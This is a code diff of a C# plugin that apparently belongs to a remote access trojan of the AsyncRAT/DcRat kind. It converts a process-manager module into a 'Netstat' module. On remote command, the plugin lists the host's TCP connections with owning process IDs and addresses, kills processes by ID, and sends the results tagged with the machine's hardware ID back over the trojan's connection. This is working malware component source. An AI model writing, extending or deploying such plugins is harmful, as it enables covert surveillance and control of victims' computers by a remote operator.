@@ -1,4 +1,5 @@
 ﻿using MessagePackLib.MessagePack;
+using Plugin.Handler;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -21,32 +22,32 @@ namespace Plugin
             unpack_msgpack.DecodeFromBytes((byte[])data);
             switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
             {
-                case "processManager":
+                case "Netstat":
                     {
                         switch (unpack_msgpack.ForcePathObject("Option").AsString)
                         {
                             case "List":
                                 {
-                                    new HandleProcessManager().ProcessList();
+                                    new HandleNetstat().NetstatList();
                                     break;
                                 }
 
                             case "Kill":
                                 {
-                                    new HandleProcessManager().ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
+                                    new HandleNetstat().Kill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                                     break;
                                 }
-                        }                        
+                        }
                     }
                     break;
-
             }
         }
     }
 
-    public class HandleProcessManager
+    
+    public class HandleNetstat
     {
-        public void ProcessKill(int ID)
+        public void Kill(int ID)
         {
             foreach (var process in Process.GetProcesses())
             {
@@ -59,42 +60,29 @@ namespace Plugin
                 }
                 catch { };
             }
-            ProcessList();
+            NetstatList();
         }
 
-        public void ProcessList()
+        public void NetstatList()
         {
             try
             {
                 StringBuilder sb = new StringBuilder();
-                var query = "SELECT ProcessId, Name, ExecutablePath FROM Win32_Process";
-                using (var searcher = new ManagementObjectSearcher(query))
-                using (var results = searcher.Get())
+                TcpConnectionTableHelper.MIB_TCPROW_OWNER_PID[] tcpProgressInfoTable = TcpConnectionTableHelper.GetAllTcpConnections();
+
+
+
+                int tableRowCount = tcpProgressInfoTable.Length;
+                for (int i = 0; i < tableRowCount; i++)
                 {
-                    var processes = results.Cast<ManagementObject>().Select(x => new
-                    {
-                        ProcessId = (UInt32)x["ProcessId"],
-                        Name = (string)x["Name"],
-                        ExecutablePath = (string)x["ExecutablePath"]
-                    });
-                    foreach (var p in processes)
-                    {
-                        if (File.Exists(p.ExecutablePath))
-                        {
-                            string name = p.ExecutablePath;
-                            string key = p.ProcessId.ToString();
-                            Icon icon = Icon.ExtractAssociatedIcon(p.ExecutablePath);
-                            Bitmap bmpIcon = icon.ToBitmap();
-                            using (MemoryStream ms = new MemoryStream())
-                            {
-                                bmpIcon.Save(ms, ImageFormat.Png);
-                                sb.Append(name + "-=>" + key + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
-                            }
-                        }
-                    }
+                    TcpConnectionTableHelper.MIB_TCPROW_OWNER_PID row = tcpProgressInfoTable[i];
+                    string source = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.localAddr), row.LocalPort);
+                    string dest = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.remoteAddr), row.RemotePort);
+                    sb.Append(row.owningPid + "-=>" + source + "-=>" + dest + "-=>" + (TCP_CONNECTION_STATE)row.state + "-=>");
                 }
+                Debug.WriteLine(sb);
                 MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Pac_ket").AsString = "processManager";
+                msgpack.ForcePathObject("Pac_ket").AsString = "netstat";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                 msgpack.ForcePathObject("Message").AsString = sb.ToString();
                 Connection.Send(msgpack.Encode2Bytes());
